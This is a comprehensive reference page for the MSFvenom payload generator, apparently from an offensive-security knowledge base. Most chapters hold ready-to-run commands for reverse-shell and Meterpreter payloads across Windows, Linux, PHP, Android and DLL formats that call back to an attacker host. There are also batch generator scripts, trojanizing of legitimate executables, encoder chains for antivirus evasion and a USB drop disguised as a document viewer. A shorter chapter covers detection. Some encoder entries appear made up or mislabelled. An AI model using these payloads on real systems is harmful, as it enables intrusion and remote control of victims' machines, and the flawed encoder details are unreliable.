---
title: "MSFvenom"
tool_name: "msfvenom"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Beginner to Advanced"
platform: "Linux, Windows, macOS"
language: "Ruby"
license: "BSD-3-Clause"
repository: "https://github.com/rapid7/metasploit-framework"
kali_package: "metasploit-framework"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "shellcode"
  - "payload-generation"
  - "metasploit"
  - "encoding"
  - "evasion"
date_created: "2011-08-25"
last_updated: "2024-01-15"
author: "Rapid7"
---

# MSFvenom — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

MSFvenom is the Metasploit Framework's standalone payload generator, replacing the legacy `msfpayload` and `msfencode` tools that were deprecated in 2015. It is the single most widely used payload generation tool in offensive security, capable of producing shellcode, executables, DLLs, and scripts for virtually every target platform.

### Core Purpose

MSFvenom generates payloads — self-contained code that, when executed on a target, provides the attacker with remote access. These payloads range from simple command shells to full Meterpreter sessions with post-exploitation capabilities.

### Key Concepts

**Payloads** are the code delivered to a target. Two fundamental types exist:

- **Staged payloads** (`windows/meterpreter/reverse_tcp`): A small stager downloads and executes the full payload from the attacker's machine. Requires a handler but produces smaller output.
- **Stageless payloads** (`windows/meterpreter_reverse_tcp`): The complete payload embedded in a single package. Larger but independent — no handler staging required.

**Encoders** transform payload bytes to avoid detection or bad characters. The encoder applies a transformation that the decoder stub reverses at runtime.

**NOP sleds** (`\x90` on x86) provide a landing buffer for exploitation, increasing the probability of hitting executable shellcode when the exact return address is uncertain.

**Bad characters** are bytes that break payload delivery — `\x00` (null), `\x0a` (newline), `\x0d` (carriage return) are common culprits depending on the injection context.

### Why MSFvenom Matters

Every penetration test, red team engagement, and CTF exploitation likely involves MSFvenom at some stage. Understanding its payload taxonomy, encoder options, and output formats is foundational knowledge for offensive security practitioners.

---

## Chapter 2: Installation & Setup

### Kali Linux (Pre-installed)

MSFvenom ships with the `metasploit-framework` package, pre-installed on all Kali Linux images.

```bash
sudo apt update && sudo apt install metasploit-framework
```

**Explanation:** Updates package lists and installs (or updates) the Metasploit Framework including MSFvenom.

### Post-Installation Setup

MSFvenom uses PostgreSQL for workspace and credential storage. Initialize the database:

```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
msfdb init
msfdb start
```

**Explanation:** Starts PostgreSQL, enables it at boot, initializes the Metasploit database, and starts the database service.

### Verify Installation

```bash
msfvenom -h
```

Expected output:

```
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.

Usage: msfvenom [options] <payload> [payload options]

Options:
  -l, --list <type>     List all modules for a type
  -p, --payload <payload>  Payload to use
  -f, --format <format>  Output format (help to list)
  -b, --bad-chars <chars>  Bad characters to avoid
  -e, --encoder <encoder>  Encoder to use
  -n, --nopsled <size>  Prepend a nopsled of [size] on the payload
  -s, --space <size>    The maximum size of the payload
  -i, --iterations <count>  Times to encode the payload
  -c, --add-code <path>  Additional win32 shellcode to include
  -x, --template <path>  Executable to use as a template
  -k, --keep            Keep the template behavior
  -o, --out <path>      Save the payload
  -v, --var-name <name>  Custom variable name for the output
  --smallest            Encode with the smallest size
  -a, --arch <arch>     The architecture to use
  --platform <platform>  The platform to use
  -h, --help            Show this message
```

---

## Chapter 3: Basic Usage

### Listing Available Modules

```bash
msfvenom -l payloads
```

**Explanation:** Lists every available payload in the Metasploit Framework, organized by platform and architecture.

```bash
msfvenom -l encoders
```

**Explanation:** Lists all available encoders with their relative rankings (excellent, good, average, normal).

```bash
msfvenom -l formats
```

**Explanation:** Lists all supported output formats — exe, elf, dll, c, python, ruby, hex, raw, ps1, and many more.

```bash
msfvenom -l nops
```

**Explanation:** Lists NOP sled generators for various architectures.

### Essential Payload Generation

#### Windows Reverse Meterpreter (Staged)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe \
  -o /var/www/html/shell.exe
```

**Explanation:** Generates a staged Windows Meterpreter reverse TCP executable that connects back to 192.168.1.100 on port 4444, saved to the web root for easy delivery.

#### Linux Reverse Shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf \
  -o shell.elf
```

**Explanation:** Produces a 32-bit Linux ELF binary that establishes a Meterpreter reverse TCP connection to the attacker.

#### C Shellcode Output

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f c
```

**Explanation:** Outputs the raw shellcode as a C array, ready to embed in custom injection code.

Example output:

```c
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1"
"\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42"
"\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50"
"\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34"
"\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0"
"\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58"
"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86";
```

#### Python Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f python
```

**Explanation:** Generates the payload as a Python variable assignment, directly usable in Python-based stagers.

#### Hex Format

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f hex
```

**Explanation:** Outputs the shellcode as a continuous hex string — useful for protocols that transmit hex-encoded data.

#### PowerShell Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f ps1 \
  -o payload.ps1
```

**Explanation:** Generates a PowerShell script that, when executed, loads and runs the Meterpreter shellcode.

#### PHP Reverse Shell

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

**Explanation:** Creates a raw PHP payload for web-based exploitation scenarios where PHP execution is available.

#### Android Meterpreter

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o malicious.apk
```

**Explanation:** Generates a Meterpreter payload packaged as an Android APK for mobile device exploitation.

#### DLL Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f dll \
  -o malicious.dll
```

**Explanation:** Creates a Windows DLL payload for DLL hijacking or injection scenarios.

### Complete Flags Reference

| Flag | Long Form | Description |
|------|-----------|-------------|
| **-p** | `--payload` | Payload to use (e.g., `windows/meterpreter/reverse_tcp`) |
| **-f** | `--format` | Output format: exe, elf, dll, c, python, ruby, hex, raw, ps1, asp, jsp, war, macho, vba, etc. |
| **-o** | `--out` | Output file path |
| **-e** | `--encoder` | Encoder to use (e.g., `x86/shikata_ga_nai`) |
| **-b** | `--bad-chars` | Bad characters to avoid (e.g., `\x00\x0a\x0d`) |
| **-n** | `--nopsled` | Prepend a NOP sled of specified size |
| **-i** | `--iterations` | Number of encoding iterations |
| **-s** | `--space` | Maximum size of the resulting payload |
| **-a** | `--arch` | Target architecture: x86, x64 |
| **--platform** | | Target platform: windows, linux, osx, android |
| **-x** | `--template` | Executable template to use as a base |
| **-k** | `--keep` | Preserve template behavior and inject payload into a new thread |
| **-v** | `--var-name` | Custom variable name for output format |
| **-c** | `--add-code` | Additional shellcode to inject alongside the payload |
| **--smallest** | | Use the smallest possible encoding |
| **-t** | `--timeout` | Timeout in seconds for payload generation |
| **-h** | `--help` | Display help message |

### Common Output Formats

| Format | Extension | Use Case |
|--------|-----------|----------|
| **exe** | `.exe` | Windows executable — direct delivery |
| **elf** | `.elf` | Linux ELF binary |
| **dll** | `.dll` | Windows DLL — hijacking/injection |
| **macho** | `.macho` | macOS executable |
| **c** | `.c` | C array — embed in custom loaders |
| **python** | `.py` | Python variable — script-based stagers |
| **ruby** | `.rb` | Ruby variable — Metasploit modules |
| **powershell** | `.ps1` | PowerShell script |
| **raw** | (binary) | Raw bytes — pipe to other tools |
| **hex** | `.hex` | Hex string — protocol injection |
| **ps1** | `.ps1` | PowerShell script |
| **asp** | `.asp` | ASP webshell |
| **jsp** | `.jsp` | JSP webshell |
| **war** | `.war` | Java WAR archive |
| **vba** | `.vba` | VBA macro — Office document delivery |
| **bash** | `.sh` | Bash script |

---

## Chapter 4: Intermediate Usage

### Scripting and Automation

#### Batch Payload Generator (Bash)

```bash
#!/bin/bash
# Generate payloads for multiple platforms
LHOST="192.168.1.100"
LPORT="4444"
OUTPUT_DIR="./payloads"
mkdir -p "$OUTPUT_DIR"

# Windows payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT_DIR/win_rev.exe"
msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT_DIR/win_rev_http.exe"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT_DIR/win64_rev.exe"

# Linux payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT_DIR/linux32_rev.elf"
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT_DIR/linux64_rev.elf"

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT_DIR/php_rev.php"
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o "$OUTPUT_DIR/java_rev.war"

echo "[+] Generated $(ls $OUTPUT_DIR | wc -l) payloads in $OUTPUT_DIR"
```

**Explanation:** Automates generation of payloads across Windows, Linux, and web platforms for multi-target engagements.

#### Python Batch Generator

```python
#!/usr/bin/env python3
import subprocess
import os

LHOST = "192.168.1.100"
LPORT = "4444"
OUTPUT_DIR = "./payloads"

payloads = {
    "windows_meterpreter_rev_tcp": {
        "payload": "windows/meterpreter/reverse_tcp",
        "format": "exe",
        "ext": "exe"
    },
    "windows_shell_rev_tcp": {
        "payload": "windows/shell_reverse_tcp",
        "format": "c",
        "ext": "c"
    },
    "linux_x64_rev_tcp": {
        "payload": "linux/x64/meterpreter/reverse_tcp",
        "format": "elf",
        "ext": "elf"
    },
    "php_meterpreter_rev_tcp": {
        "payload": "php/meterpreter/reverse_tcp",
        "format": "raw",
        "ext": "php"
    },
}

os.makedirs(OUTPUT_DIR, exist_ok=True)

for name, config in payloads.items():
    output = f"{OUTPUT_DIR}/{name}.{config['ext']}"
    cmd = [
        "msfvenom",
        "-p", config["payload"],
        f"LHOST={LHOST}",
        f"LPORT={LPORT}",
        "-f", config["format"],
        "-o", output
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Generated: {output}")
    else:
        print(f"[-] Failed: {name} - {result.stderr}")
```

**Explanation:** Python-based batch generator that iterates through a payload dictionary and produces multiple output files.

### Tool Chaining

#### MSFvenom → Shellter Pipeline

```bash
# Generate raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o shellcode.bin

# Inject into a legitimate PE using Shellter
# (Shellter is interactive; this shows the concept)
echo "[*] Feed shellcode.bin to Shellter when prompted"
```

**Explanation:** Produces raw shellcode for injection into legitimate Windows executables via Shellter's dynamic PE infection.

#### MSFvenom → Veil Pipeline

```bash
# Use MSFvenom shellcode within Veil
./Veil.py -t Evasion -p c/shellcode_inject/virtual_alloc.py \
  --ip 192.168.1.100 --port 4444 \
  --msfvenom windows/meterpreter/reverse_tcp
```

**Explanation:** Feeds MSFvenom shellcode into Veil for additional AV evasion through language-based obfuscation.

#### Handler Resource Script

```bash
# Generate payload + handler resource file simultaneously
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o shell.exe

# Create handler resource script
cat << 'EOF' > handler.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

# Launch handler
msfconsole -q -r handler.rc
```

**Explanation:** Generates both the payload and a matching Metasploit handler resource script for automated listener setup.

### Complete Payload Categories

#### Windows Payloads

| Payload | Type | Description |
|---------|------|-------------|
| `windows/meterpreter/reverse_tcp` | Staged | Full Meterpreter over TCP |
| `windows/meterpreter/reverse_http` | Staged | Meterpreter over HTTP |
| `windows/meterpreter/reverse_https` | Staged | Meterpreter over HTTPS (encrypted) |
| `windows/meterpreter/bind_tcp` | Staged | Meterpreter bind shell |
| `windows/meterpreter_reverse_tcp` | Stageless | Standalone Meterpreter reverse TCP |
| `windows/shell_reverse_tcp` | Stageless | Command shell reverse TCP |
| `windows/shell_reverse_tcp_rc4` | Stageless | RC4 encrypted shell |
| `windows/meterpreter/reverse_tcp_dns` | Staged | Meterpreter over DNS |
| `windows/x64/meterpreter/reverse_tcp` | Staged | 64-bit Meterpreter reverse TCP |

#### Linux Payloads

| Payload | Architecture | Description |
|---------|-------------|-------------|
| `linux/x86/meterpreter/reverse_tcp` | x86 | 32-bit Meterpreter |
| `linux/x64/meterpreter/reverse_tcp` | x64 | 64-bit Meterpreter |
| `linux/x86/shell/reverse_tcp` | x86 | 32-bit shell |
| `linux/x64/shell/reverse_tcp` | x64 | 64-bit shell |
| `linux/x86/meterpreter/bind_tcp` | x86 | 32-bit bind shell |
| `linux/x64/meterpreter/bind_tcp` | x64 | 64-bit bind shell |

#### Web Payloads

| Payload | Language | Use Case |
|---------|----------|----------|
| `php/meterpreter/reverse_tcp` | PHP | PHP webshell |
| `java/jsp_shell_reverse_tcp` | Java | JSP reverse shell |
| `python/meterpreter/reverse_tcp` | Python | Python stager |
| `ruby/shell_reverse_tcp` | Ruby | Ruby reverse shell |
| `nodejs/shell_reverse_tcp` | Node.js | Node.js reverse shell |
| `powershell/meterpreter/reverse_tcp` | PowerShell | PowerShell stager |

#### Other Platforms

| Payload | Platform | Description |
|---------|----------|-------------|
| `osx/x86/shell_reverse_tcp` | macOS | macOS x86 shell |
| `android/meterpreter/reverse_tcp` | Android | Android Meterpreter |
| `multi/meterpreter/reverse_tcp` | Multi | Cross-platform |

---

## Chapter 5: Advanced Usage

### Encoder Reference

| Encoder | Architecture | Type | Description |
|---------|-------------|------|-------------|
| **generic/none** | Any | None | No encoding — raw payload |
| **x86/shikata_ga_nai** | x86 | Polymorphic | XOR-based polymorphic encoder — mutates each iteration |
| **x86/fnstenv_mov** | x86 | Alphanumeric | Fnstenv-based alphanumeric encoder |
| **x86/jmp_call_additive** | x86 | Alphanumeric | JMP/CALL-based additive encoder |
| **x64/xor** | x64 | Basic | XOR encoder for 64-bit payloads |
| **x64/zmp4** | x64 | Advanced | Multi-byte XOR encoder |
| **cmd/powershell_base64** | Any | Obfuscation | PowerShell Base64 encoding |
| **php/base64** | PHP | Obfuscation | Base64 for PHP payloads |
| **python/magic_prefixed_shikata** | x86 | Polymorphic | Shikata with magic byte prefix |

### Multi-Stage Encoding

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f raw \
  -o encoded.bin
```

**Explanation:** Applies five iterations of the Shikata Ga Nai polymorphic encoder, producing a different binary output each time.

**Practical caveat:** More encoding iterations increase payload size and AV detection time. Three to five iterations balance evasion with size. Beyond five, diminishing returns set in — some AV engines simply flag heavily encoded payloads as suspicious.

### Bad Character Avoidance

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f c
```

**Explanation:** Generates the payload while avoiding null bytes, newlines, and carriage returns — critical for buffer overflow exploits where these characters truncate or break the payload.

### Template-Based Payloads

```bash
# Inject payload into a legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -x /usr/share/windows-resources/binaries/rar.exe \
  -k \
  -f exe \
  -o trojanized.exe
```

**Explanation:** Uses a legitimate RAR archiver as a template, injecting the payload while preserving the original application's behavior via the `-k` (keep) flag.

**Practical caveat:** Not all templates work. The template must have enough code cave space or support thread injection. Test with simple payloads first.

### Smallest Payload

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  --smallest \
  -b '\x00' \
  -f c
```

**Explanation:** Generates the smallest possible payload by optimizing the encoding and stripping unnecessary functionality.

### Raw Shellcode for Injection Tools

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw \
  > shellcode.bin
```

**Explanation:** Outputs raw binary shellcode — the universal interchange format for use with injection tools like Shellter, BDF, Cymothoa, and custom loaders.

### AV Evasion Techniques

1. **Bad character encoding**: Avoid bytes that trigger signature detection.
2. **Polymorphic encoding**: Use `shikata_ga_nai` with multiple iterations.
3. **Template injection**: Embed payloads in legitimate executables.
4. **Staged payloads**: Smaller footprint reduces detection surface.
5. **HTTPS payloads**: `reverse_https` encrypts communication, evading IDS/IPS.
6. **Custom encoders**: Write your own for unique byte patterns.
7. **Payload segmentation**: Split delivery across multiple stages.

### NOP Sled Concepts

A NOP sled (`\x90` on x86) is a sequence of no-operation instructions placed before shellcode. When exploiting a buffer overflow, control might land anywhere within the sled — each `\x90` slides down to the actual shellcode.

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -n 64 \
  -f raw \
  -o shellcode.bin
```

**Explanation:** Prepends 64 bytes of NOP sled to the payload, increasing the margin of error for return address targeting.

**When to use NOP sleds:**
- Buffer overflow exploitation with imprecise addresses
- Return-oriented programming (ROP) chain alignment
- When ASLR is disabled or predictable

**When to avoid NOP sleds:**
- They increase payload size proportionally
- Modern AV engines flag large NOP regions
- ASLR and DEP/NX often make sleds ineffective
- For injection tools, raw shellcode without sleds is preferred

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Red Team Engagement — Multi-Stage Payload Delivery

During a red team assessment of a financial institution, the perimeter was protected by a next-generation firewall (NGFW) inspecting outbound traffic. Standard reverse TCP payloads were immediately quarantined.

**Approach:** Generate HTTPS-based Meterpreter payloads with template injection:

```bash
# Create HTTPS Meterpreter payload
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=192.168.1.100 LPORT=443 \
  -k \
  -x legitimate_update.exe \
  -f exe \
  -o update_helper.exe

# Set up the handler
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443
set HandlerSSLCert /path/to/cert.pem
exploit -j
"
```

**Explanation:** The HTTPS payload blends with legitimate web traffic, and the template preserves the update helper's normal behavior, reducing behavioral detection.

The handler was configured with a legitimate SSL certificate to match the encrypted traffic profile. The staged payload kept the initial delivery under 1KB, and the full Meterpreter session was established only after the stager connected back.

### Scenario 2: CTF Challenge — Extracting Shellcode from a Binary

In a CTF exploitation challenge, a vulnerable service on `target.example.com` accepted input up to 512 bytes but had a buffer overflow in a 480-byte buffer. The binary had no stack canaries but DEP was enabled.

**Approach:** Generate position-independent shellcode with bad character avoidance:

```bash
# Generate shellcode avoiding bad characters
msfvenom -p linux/x86/exec CMD="/bin/sh" \
  -b '\x00\x0a\x0d\x20' \
  --smallest \
  -f c

# Alternative: generate from shell-storm for minimal size
msfvenom -p linux/x86/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw \
  -a x86 \
  --platform linux \
  --smallest \
  -o shellcode.bin

# Verify size is under 480 bytes
wc -c shellcode.bin
```

**Explanation:** The `--smallest` flag combined with bad character avoidance ensures the shellcode fits within the buffer constraint while avoiding bytes that would break the overflow.

### Scenario 3: Purple Team Exercise — Testing AV Evasion

The security team requested a purple team exercise to validate their endpoint detection and response (EDR) capabilities against encoded payloads.

```bash
# Baseline: unencoded payload (should be detected immediately)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o /tmp/test_plain.exe

# Test 1: single-stage Shikata Ga Nai
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 1 \
  -f exe -o /tmp/test_sgn_1.exe

# Test 2: five iterations of Shikata Ga Nai
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o /tmp/test_sgn_5.exe

# Test 3: multi-encoder chain
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  | msfvenom -e x86/fnstenv_mov -i 2 \
  -f exe -o /tmp/test_multi_enc.exe

# Deliver each to test endpoint and log detection results
```

**Explanation:** Generates a gradient of payloads from plain to heavily encoded, measuring the EDR's detection capabilities at each level. The results inform defensive tuning.

### Scenario 4: Internal Penetration Test — Payload Delivery via USB

During an internal engagement requiring physical access simulation, payloads needed to fit on USB drives alongside legitimate documents while maintaining reliability.

```bash
# Generate a stageless payload for standalone execution
msfvenom -p windows/meterpreter_reverse_tcp \
  LHOST=10.0.0.50 LPORT=4444 \
  -f exe \
  -o document_viewer.exe

# Hash the output for integrity verification
sha256sum document_viewer.exe
```

**Explanation:** Stageless payloads (`meterpreter_reverse_tcp` with underscore) execute independently without requiring a Metasploit stager, making them reliable for environments where the attacker might not be online when the target executes the file.

---

## Chapter 7: Detection & Defense

### Signature-Based Detection

AV vendors maintain signature databases for known MSFvenom output patterns. Indicators include:

- The Shikata Ga Nai decoder stub (recursive XOR pattern)
- Meterpreter stage patterns (known magic bytes)
- Metasploit handler protocol signatures
- Common MSFvenom output format headers

### Behavioral Analysis

Modern EDR solutions monitor for:

- **Process injection**: Writing to remote process memory, especially with `PAGE_EXECUTE_READWRITE` permissions
- **API call sequences**: `VirtualAlloc` → `WriteProcessMemory` → `CreateRemoteThread` is a classic injection chain
- **Network beacons**: Regular callback intervals typical of Meterpreter sessions
- **PowerShell execution**: Constrained Language Mode, ScriptBlock logging, AMSI scanning

### Network Indicators

Meterpreter traffic exhibits distinct patterns:

- Encrypted sessions with recognizable TLS fingerprints
- Default port usage (443, 4444, 8080)
- Session negotiation traffic with known byte patterns
- Staged payload transfers appear as anomalous binary downloads

### YARA Rules

```yara
rule MSFvenom_Shikata_Ga_Nai {
    meta:
        description = "Detects Shikata Ga Nai encoder stub"
        author = "Security Team"
        date = "2024-01-15"
    strings:
        $sgn_decoder = { D9 74 24 F4 5? 33 ?? 83 ?? 04 03 }
    condition:
        $sgn_decoder at entrypoint or $sgn_decoder in (0..filesize)
}
```

**Explanation:** YARA rule that detects the Shikata Ga Nai decoder stub by its characteristic FPU and XOR instruction sequence.

### AMSI Integration

PowerShell payloads generated by MSFvenom are scanned by AMSI before execution. Defensive measures include:

- Enable AMSI in Windows Defender
- Monitor AMSI bypass attempts in PowerShell logs
- Implement PowerShell Constrained Language Mode
- Log all PowerShell script block execution

### Memory Scanning

Runtime memory analysis can detect injected shellcode:

- Scan for RWX memory regions outside loaded modules
- Look for XOR-encoded data patterns in executable memory
- Monitor for CLR injection (relevant for PowerShell and .NET payloads)
- Use tools like PE-sieve or Moneta for automated scanning

---

## Chapter 8: Troubleshooting

### "No payload would be generated"

**Cause:** Invalid payload name or incompatible options.

```bash
# Verify payload name
msfvenom -l payloads | grep "windows/meterpreter"
```

**Explanation:** Ensures the payload name matches exactly — typos and missing path segments are the most common cause.

### "Bad Char" Encoding Fails

**Cause:** Requested bad characters cannot be avoided by the encoder.

```bash
# Reduce bad character list
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -b '\x00' \
  -f exe -o shell.exe
```

**Explanation:** Start with only null byte avoidance (`\x00`) and add bad characters incrementally to find a working combination.

### Handler Won't Connect

**Cause:** LHOST/LPORT mismatch between payload and handler, or firewall blocking.

```bash
# Verify handler settings match payload exactly
msfconsole -q -x "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
show options
exploit
"
```

**Explanation:** The handler's PAYLOAD, LHOST, and LPORT must exactly match the values used during payload generation — even a single byte difference breaks the connection.

### "Payload exceeds space limit"

**Cause:** The target buffer is too small for the encoded payload.

```bash
# Use --smallest to minimize size
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  --smallest \
  -b '\x00' \
  -f c

# Or use a smaller payload type
msfvenom -p windows/exec CMD="cmd.exe" -f c
```

**Explanation:** Switch to stageless payloads without encoding, or use exec/cmd payloads for minimal footprint.

### Staged Payload Fails to Stage

**Cause:** Network connectivity, handler not listening, or architecture mismatch.

```bash
# Use stageless payload instead
msfvenom -p windows/meterpreter_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o shell.exe
```

**Explanation:** Stageless payloads (`_reverse_tcp` with underscore) do not require a staging phase and work through more restrictive network configurations.

---

## Resources

### Official Documentation

- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — Free comprehensive guide
- [Rapid7 Documentation](https://docs.rapid7.com/metasploit/) — Official MSFvenom reference
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework) — Source code and issues

### Payload References

- [Shell-Storm Database](http://shell-storm.org/shellcode/) — Community shellcode archive
- [Exploit Database Shellcodes](https://www.exploit-db.com/shellcodes) — Searchable shellcode repository
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Comprehensive payload collection

### Learning Resources

- [OffSec PEN-200 Course](https://www.offsec.com/courses/pen-200/) — Official OSCP preparation
- [Metasploit Wiki](https://github.com/rapid7/metasploit-framework/wiki) — Community-maintained knowledge base
- [HackTheBox](https://www.hackthebox.com/) — Practice exploitation scenarios

### Books

- "Metasploit: The Penetration Tester's Guide" — David Kennedy et al.
- "Penetration Testing" — Georgia Weidman
- "The Hacker Playbook 3" — Peter Kim

---

*Last updated: July 2026*
